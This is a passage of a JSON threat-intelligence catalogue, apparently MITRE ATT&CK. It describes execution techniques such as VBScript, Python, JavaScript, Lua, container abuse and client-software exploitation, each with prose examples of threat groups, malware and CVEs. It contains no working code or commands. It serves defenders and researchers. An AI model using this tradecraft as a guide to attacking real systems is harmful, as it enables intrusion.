"OilRig has used VBScript macros for execution on compromised hosts."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE creates and uses a VBScript as part of its persistent execution."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors executed an encoded VBScript file using wscript and wrote the decoded output to a text file."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group executed a VBA written malicious macro after victims download malicious DOTM files; Lazarus Group also used Visual Basic macro code to extract a double Base64 encoded DLL implant."}, {"id": "C0016", "name": "Operation Dust Storm", "description": "During Operation Dust Storm, the threat actors used Visual Basic scripts."}, {"id": "C0006", "name": "Operation Honeybee", "description": "For Operation Honeybee, the threat actors used a Visual Basic script embedded within a Word document to download an implant."}, {"id": "C0013", "name": "Operation Sharpshooter", "description": "During Operation Sharpshooter, the threat actors used a VBA macro to execute a simple downloader that installed Rising Sun."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used VBScript to conduct reconnaissance on targeted systems."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D uses Word macros for execution."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork used Visual Basic Scripts (VBS) on victim machines."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has used Word documents with VBScripts to execute malicious activities."}, {"id": "S0441", "name": "PowerShower", "description": "PowerShower has the ability to save and execute VBScript."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS can use VBScript (VBE) code for execution."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon can use a malicious VBS file for execution."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can use VBS to download and execute malicious files."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT uses VBScripts."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay has included embedded Visual Basic scripts in malicious documents."}, {"id": "G0075", "name": "Rancor", "description": "Rancor has used VBS scripts as well as embedded macros for execution."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used VBScript to run malicious files."}, {"id": "S0375", "name": "Remexi", "description": "Remexi uses AutoIt and VBS scripts throughout its execution process."}, {"id": "S0496", "name": "REvil", "description": "REvil has used obfuscated VBA macros for execution."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT has used Visual Basic for execution."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has used .vbs scripts for execution."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has created VBScripts to run an SSH server."}, {"id": "S0589", "name": "Sibot", "description": "Sibot executes commands using VBScript."}, {"id": "G1008", "name": "SideCopy", "description": "SideCopy has sent Microsoft Office Publisher documents to victims that have embedded malicious macros that execute an hta file via calling mshta.exe."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used VBScript to drop and execute malware loaders."}, {"id": "G0091", "name": "Silence", "description": "Silence has used VBS scripts."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader adds a Visual Basic script in the Startup folder to deploy the payload."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 can use visual basic scripts for first-stage execution."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "For the SolarWinds Compromise, APT29 wrote malware such as Sibot in Visual Basic."}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has used malicious VBA macros in Microsoft Word documents and Excel spreadsheets that execute an AutoOpen subroutine."}, {"id": "S1037", "name": "STARWHALE", "description": "STARWHALE can use the VBScript function GetRef as part of its persistence mechanism."}, {"id": "S0380", "name": "StoneDrill", "description": "StoneDrill has several VBS scripts used throughout the malware's lifecycle."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST used VBScripts to initiate the execution of payloads."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady has used VBA macros to execute shellcode."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used VBS files to execute or establish persistence for additional payloads, often using file names consistent with email themes or mimicking system functionality."}, {"id": "G0062", "name": "TA459", "description": "TA459 has a VBScript for execution."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used VBS for code execution."}, {"id": "G0134", "name": "Transparent Tribe", "description": "Transparent Tribe has crafted VBS-based malicious documents."}, {"id": "G0010", "name": "Turla", "description": "Turla has used VBS scripts throughout its operations."}, {"id": "S0263", "name": "TYPEFRAME", "description": "TYPEFRAME has used a malicious Word document for delivery with VBA macros for execution."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif droppers have used VBA macros to download and execute the malware's full executable payload."}, {"id": "S0442", "name": "VBShower", "description": "VBShower has the ability to execute VBScript files."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can use a Visual Basic script to exclude the C:\\ drive from Windows Defender."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has used Visual Basic 6 (VB6) payloads."}, {"id": "G0090", "name": "WIRTE", "description": "WIRTE has used VBScript  in its operations."}, {"id": "S0341", "name": "Xbash", "description": "Xbash can execute malicious VBScript payloads on the victim\u2019s machine."}]}, {"name": "Python", "description": "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the python.exe interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.", "detailed_description": "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the python.exe interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.", "id": "T1059.006", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 has developed malware variants written in Python."}, {"id": "G0067", "name": "APT37", "description": "APT37 has used Python scripts to execute payloads."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used a command line utility and a network scanner written in python."}, {"id": "S0234", "name": "Bandook", "description": "Bandook can support commands to execute Python-based payloads."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has made use of Python-based remote access tools."}, {"id": "S0482", "name": "Bundlore", "description": "Bundlore has used Python scripts to execute payloads."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has used Python scripts for execution and the installation of additional files."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has used a customized version of the Impacket wmiexec.py module to create renamed output files."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use Python to perform execution."}, {"id": "S0369", "name": "CoinTicker", "description": "CoinTicker executes a Python script to download its second stage."}, {"id": "S0492", "name": "CookieMiner", "description": "CookieMiner has used python scripts on the user\u2019s system, as well as the Python variant of the Empire agent, EmPyre."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used a Python reverse shell and the PySoxy SOCKS5 proxy tool."}, {"id": "S0695", "name": "Donut", "description": "Donut can generate shellcode outputs that execute via Python."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has used various types of scripting to perform operations, including Python scripts. The group was observed installing Python 2.7 on a victim."}, {"id": "S0547", "name": "DropBook", "description": "DropBook is a Python-based backdoor compiled with PyInstaller."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca used Python scripts for port scanning or building reverse shells."}, {"id": "S0377", "name": "Ebury", "description": "Ebury has used Python to implement its DGA."}, {"id": "S1120", "name": "FRAMESTING", "description": "FRAMESTING is a Python web shell that can embed in the Ivanti Connect Secure CAV Python package."}, {"id": "S0581", "name": "IronNetInjector", "description": "IronNetInjector can use IronPython scripts to load payloads with the help of a .NET injector."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy uses Python scripts for installing files and performing execution."}, {"id": "S0276", "name": "Keydnap", "description": "Keydnap uses Python for scripting to execute additional commands."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used a macOS Python implant to gather data as well as MailFetcher.py code to automatically collect email data."}, {"id": "S0409", "name": "Machete", "description": "Machete is written in Python and is used in conjunction with additional Python scripts."}, {"id": "G0095", "name": "Machete", "description": "Machete used multiple compiled Python scripts on the victim\u2019s system. Machete's main backdoor Machete is also written in Python."}, {"id": "S0459", "name": "MechaFlounder", "description": "MechaFlounder uses a python-based payload."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has developed tools in Python including Out1."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors' backdoors were written in Python and compiled with py2exe."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT was executed with a Python script and worked in conjunction with additional Python-based post-exploitation tools."}, {"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY has used python scripts."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can use an add on feature when creating payloads that allows you to create custom Python scripts (\"scriptlets\") to perform tasks offline (without requiring a session) such as sandbox detection, adding persistence, etc."}, {"id": "S1032", "name": "PyDCrypt", "description": "PyDCrypt, along with its functions, is written in Python."}, {"id": "S0583", "name": "Pysa", "description": "Pysa has used Python scripts to deploy ransomware."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used a Python script to establish outbound communication and to execute commands using SMB port 445."}, {"id": "S0332", "name": "Remcos", "description": "Remcos uses Python scripts."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has used Python-based malware to install and spread their coinminer."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY is written in Python and can use multiple Python scripts for execution on targeted systems."}, {"id": "S1035", "name": "Small Sieve", "description": "Small Sieve can use Python scripts to execute commands."}, {"id": "S0374", "name": "SpeakUp", "description": "SpeakUp uses Python scripts."}, {"id": "G0131", "name": "Tonto Team", "description": "Tonto Team has used Python-based tools for execution."}, {"id": "S0647", "name": "Turian", "description": "Turian has the ability to use Python to spawn a Unix shell."}, {"id": "G0010", "name": "Turla", "description": "Turla has used IronPython scripts as part of the IronNetInjector toolchain to drop payloads."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has used Python-based implants to interact with compromised hosts."}]}, {"name": "JavaScript", "description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.", "detailed_description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the Component Object Model and Internet Explorer HTML Application (HTA) pages.\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and AppleScript. Scripts can be executed via the command line utility osascript, they can be compiled into applications or script files via osacompile, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a Drive-by Compromise or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of Obfuscated Files or Information.", "id": "T1059.007", "examples": [{"id": "S0622", "name": "AppleSeed", "description": "AppleSeed has the ability to use JavaScript to execute PowerShell."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used JavaScript for drive-by downloads and C2 communications."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth uses JavaScript to perform its core functionalities. "}, {"id": "S0640", "name": "Avaddon", "description": "Avaddon has been executed through a malicious JScript downloader."}, {"id": "S0482", "name": "Bundlore", "description": "Bundlore can execute JavaScript by injecting it into the victim's browser."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors used a malicious HTA file that contained a mix of encoded HTML and JavaScript/VBScript code."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 deployed JScript web shells on compromised systems."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has used JavaScript and Node.Js information stealer script that exfiltrates data using the node process."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has executed JavaScript scriptlets on the victim's machine."}, {"id": "S0154", "name": "Cobalt Strike", "description": "The Cobalt Strike System Profiler can use JavaScript to perform reconnaissance actions."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman uses JavaScript to perform its core functionalities."}, {"id": "S0695", "name": "Donut", "description": "Donut can generate shellcode outputs that execute via JavaScript or JScript."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has manipulated legitimate websites to inject malicious JavaScript code as part of their watering hole operations."}, {"id": "S0634", "name": "EnvyScout", "description": "EnvyScout can write files to disk with JavaScript using a modified version of the open-source tool FileSaver."}, {"id": "G0120", "name": "Evilnum", "description": "Evilnum has used malicious JavaScript files on the victim's machine."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used malicious JavaScript to steal payment card data from e-commerce sites."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 used JavaScript scripts to help perform tasks on the victim's machine."}, {"id": "S1144", "name": "FRP", "description": "FRP can support the use of a JSON configuration file."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader can execute a Javascript file for initial infection."}, {"id": "S0417", "name": "GRIFFON", "description": "GRIFFON is written in and executed as JavaScript."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa used JavaScript to execute additional files."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has used malicious JavaScript files for several components of their attack."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can use a JavaScript file as part of its execution chain."}, {"id": "S0283", "name": "jRAT", "description": "jRAT has been distributed as HTA files with JScript."}, {"id": "S0648", "name": "JSS Loader", "description": "JSS Loader can download and execute JavaScript files."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used JScript for logging and downloading additional tools."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has executed malicious JavaScript code."}, {"id": "S1075", "name": "KOPILUWAK", "description": "KOPILUWAK had used Javascript to perform its core functions."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has used JavaScript files as part its infection chain during malicious spam  email campaigns."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has used JavaScript in its attacks."}, {"id": "G0077", "name": "Leafminer", "description": "Leafminer infected victims using JavaScript code."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo includes payloads written in JavaScript."}, {"id": "G0021", "name": "Molerats", "description": "Molerats used various implants, including those built with JS, on target machines."}, {"id": "G1019", "name": "MoustachedBouncer", "description": "MoustachedBouncer has used JavaScript to deliver malware hosted on HTML pages."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used JavaScript files to execute its POWERSTATS payload."}, {"id": "S0228", "name": "NanHaiShu", "description": "NanHaiShu executes additional Jscript code on the victim's machine."}, {"id": "C0016", "name": "Operation Dust Storm", "description": "During Operation Dust Storm, the threat actors used JavaScript code."}, {"id": "C0036", "name": "Pikabot Distribution February 2024", "description": "Pikabot Distribution February 2024 utilized obfuscated JavaScript files for initial Pikabot payload download."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS can use JavaScript code for execution."}, {"id": "S0650", "name": "QakBot", "description": "The QakBot web inject module can inject Java Script into web banking pages visited by the victim."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear has delivered malicious Microsoft Office files containing an embedded JavaScript object that would, on execution, download and execute OutSteel and Saint Bot."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used JavaScript to drop and execute malware loaders."}, {"id": "G0091", "name": "Silence", "description": "Silence has used JS scripts."}, {"id": "S1124", "name": "SocGholish", "description": "The SocGholish payload is executed as JavaScript."}, {"id": "S0646", "name": "SpicyOmelette", "description": "SpicyOmelette has the ability to execute arbitrary JavaScript code on a compromised host."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has used JavaScript to redirect victim traffic from an adversary controlled server to a server hosting the Evilginx phishing framework."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used JavaScript for code execution."}, {"id": "G1037", "name": "TA577", "description": "TA577 has used JavaScript to execute additional malicious payloads."}, {"id": "G1038", "name": "TA578", "description": "TA578 has used JavaScript files in malware execution chains."}, {"id": "G0010", "name": "Turla", "description": "Turla has used various JavaScript-based backdoors."}, {"id": "S0476", "name": "Valak", "description": "Valak can execute JavaScript containing configuration data for establishing persistence."}, {"id": "S1116", "name": "WARPWIRE", "description": "WARPWIRE is a credential harvester written in JavaScript."}, {"id": "C0037", "name": "Water Curupira Pikabot Distribution", "description": "Water Curupira Pikabot Distribution initial delivery included obfuscated JavaScript objects stored in password-protected ZIP archives."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern delivered malicious JavaScript to exploit targets when exploiting Roundcube Webmail servers."}, {"id": "S0341", "name": "Xbash", "description": "Xbash can execute malicious JavaScript payloads on the victim\u2019s machine."}]}, {"name": "Network Device CLI", "description": "Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands.", "detailed_description": "Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands.\nScripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or SSH.\nAdversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.", "id": "T1059.008", "examples": []}, {"name": "Cloud API", "description": "Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, PowerShell modules like Azure for PowerShell, or software developer kits (SDKs) available for languages such as Python.", "detailed_description": "Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, PowerShell modules like Azure for PowerShell, or software developer kits (SDKs) available for languages such as Python.\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\nWith proper permissions (often via use of credentials such as Application Access Token and Web Session Cookie), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.", "id": "T1059.009", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 has leveraged the Microsoft Graph API to perform various actions across Azure and M365 environments. They have also utilized AADInternals PowerShell Modules to access the API "}, {"id": "S1091", "name": "Pacu", "description": "Pacu leverages the AWS CLI for its operations."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has leveraged AWS CLI to enumerate cloud environments with compromised credentials."}]}, {"name": "AutoHotKey & AutoIT", "description": "Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.", "detailed_description": "Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.\nAdversaries may use AHK (.ahk) and AutoIT (.au3) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as Phishing payloads.\nThese scripts may also be compiled into self-contained executable payloads (.exe).", "id": "T1059.010", "examples": [{"id": "G0087", "name": "APT39", "description": "APT39 has utilized AutoIt malware scripts embedded in Microsoft Office documents or malicious links."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate uses AutoIt scripts dropped to a hidden directory during initial installation phases, such as test.au3."}, {"id": "S0530", "name": "Melcoz", "description": "Melcoz has been distributed through an AutoIt loader script."}, {"id": "S1017", "name": "OutSteel", "description": "OutSteel was developed using the AutoIT scripting language."}]}, {"name": "Lua", "description": "Adversaries may abuse Lua commands and scripts for execution. Lua is a cross-platform scripting and programming language primarily designed for embedded use in applications. Lua can be executed on the command-line (through the stand-alone lua interpreter), via scripts (.lua), or from Lua-embedded programs (through the struct lua_State).", "detailed_description": "Adversaries may abuse Lua commands and scripts for execution. Lua is a cross-platform scripting and programming language primarily designed for embedded use in applications. Lua can be executed on the command-line (through the stand-alone lua interpreter), via scripts (.lua), or from Lua-embedded programs (through the struct lua_State).\nLua scripts may be executed by adversaries for malicious purposes. Adversaries may incorporate, abuse, or replace existing Lua interpreters to allow for malicious Lua command execution at runtime.", "id": "T1059.011", "examples": [{"id": "S0396", "name": "EvilBunny", "description": "EvilBunny has used Lua scripts to execute payloads."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has executed a Lua script through a Lua interpreter for Windows."}, {"id": "S0125", "name": "Remsec", "description": "Remsec can use modules written in Lua for execution."}]}]}, {"name": "Container Administration Command", "description": "Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.", "detailed_description": "Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.\nIn Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as docker exec to execute a command within a running container. In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as kubectl exec.", "id": "T1609", "examples": [{"id": "S0601", "name": "Hildegard", "description": "Hildegard was executed through the kubelet API run command and by executing commands on running containers."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing was executed with an Ubuntu container entry point that runs shell scripts."}, {"id": "S0683", "name": "Peirates", "description": "Peirates can use kubectl or the Kubernetes API to run commands."}, {"id": "S0623", "name": "Siloscape", "description": "Siloscape can send kubectl commands to victim clusters through an IRC channel and can run kubectl locally to spread once within a victim cluster."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT executed Hildegard through the kubelet API run command and by executing commands on running containers."}], "sub_techniques": []}, {"name": "Deploy Container", "description": "Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to Escape to Host and access other containers running on the node.", "detailed_description": "Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to Escape to Host and access other containers running on the node. \nContainers can be deployed by various means, such as via Docker's create and start APIs or via a web application such as the Kubernetes dashboard or Kubeflow.  In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes. Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.", "id": "T1610", "examples": [{"id": "S0600", "name": "Doki", "description": "Doki was run through a deployed container."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing was run through a deployed Ubuntu container."}, {"id": "S0683", "name": "Peirates", "description": "Peirates can deploy a pod that mounts its node\u2019s root file system, then execute a command to create a reverse shell on the node."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has deployed different types of containers into victim environments to facilitate execution. TeamTNT has also transferred cryptocurrency mining software to Kubernetes clusters discovered within local IP address ranges."}], "sub_techniques": []}, {"name": "Exploitation for Client Execution", "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.", "detailed_description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\nSeveral types exist:\nWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\nCommon office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.", "id": "T1203", "examples": [{"id": "G0018", "name": "admin@338", "description": "admin@338 has exploited client software vulnerabilities for execution, such as Microsoft Word CVE-2012-0158."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has exploited Office vulnerabilities such as CVE-2017-11882 and CVE-2017-8570 for execution during delivery."}, {"id": "G0138", "name": "Andariel", "description": "Andariel has exploited numerous ActiveX vulnerabilities, including zero-days."}, {"id": "G1007", "name": "Aoqin Dragon", "description": "Aoqin Dragon has exploited CVE-2012-0158 and CVE-2010-3333 for execution against targeted systems."}, {"id": "G0005", "name": "APT12", "description": "APT12 has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities (CVE-2009-3129, CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, CVE-2011-0611)."}, {"id": "G0007", "name": "APT28", "description": "APT28 has exploited Microsoft Office vulnerability CVE-2017-0262 for execution."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used multiple software exploits for common client software, like Microsoft Word, Exchange, and Adobe Reader, to gain code execution."}, {"id": "G0022", "name": "APT3", "description": "APT3 has exploited the Adobe Flash Player vulnerability CVE-2015-3113 and Internet Explorer vulnerability CVE-2014-1776."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used RTF document that includes an exploit to execute malicious code. (CVE-2017-11882)"}, {"id": "G0064", "name": "APT33", "description": "APT33 has attempted to exploit a known vulnerability in WinRAR (CVE-2018-20250), and attempted to gain remote code execution via a security bypass vulnerability (CVE-2017-11774)."}, {"id": "G0067", "name": "APT37", "description": "APT37 has used exploits for Flash Player (CVE-2016-4117, CVE-2018-4878), Word (CVE-2017-0199), Internet Explorer (CVE-2020-1380 and CVE-2020-26411), and Microsoft Edge (CVE-2021-26411) for execution."}, {"id": "G0096", "name": "APT41", "description": "APT41 leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396."}, {"id": "G0001", "name": "Axiom", "description": "Axiom has used exploits for multiple vulnerabilities including CVE-2014-0322, CVE-2012-4792, CVE-2012-1889, and CVE-2013-3893."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot leverages a known zero-day vulnerability in Adobe Flash to execute the implant into the victims\u2019 machines."}, {"id": "G1002", "name": "BITTER", "description": "BITTER has exploited Microsoft Office vulnerabilities CVE-2012-0158, CVE-2017-11882, CVE-2018-0798, and CVE-2018-0802."}, {"id": "G0098", "name": "BlackTech", "description": "BlackTech has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities CVE-2012-0158, CVE-2014-6352, CVE-2017-0199, and Adobe Flash CVE-2015-5119."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has exploited Microsoft Office vulnerabilities CVE-2014-4114, CVE-2018-0802, and CVE-2018-0798 for execution."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group had exploited multiple vulnerabilities for execution, including Microsoft\u2019s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can exploit Oracle Java vulnerabilities for execution, including CVE-2011-3544, CVE-2013-2465, CVE-2012-4681, and CVE-2013-2460."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has exploited Microsoft Office vulnerabilities, including CVE-2015-1641, CVE-2017-11882, and CVE-2018-0802."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has exploited Adobe Flash vulnerability CVE-2015-8651 for execution."}, {"id": "S0243", "name": "DealersChoice", "description": "DealersChoice leverages vulnerable versions of Flash to perform execution."}, {"id": "G0035", "name": 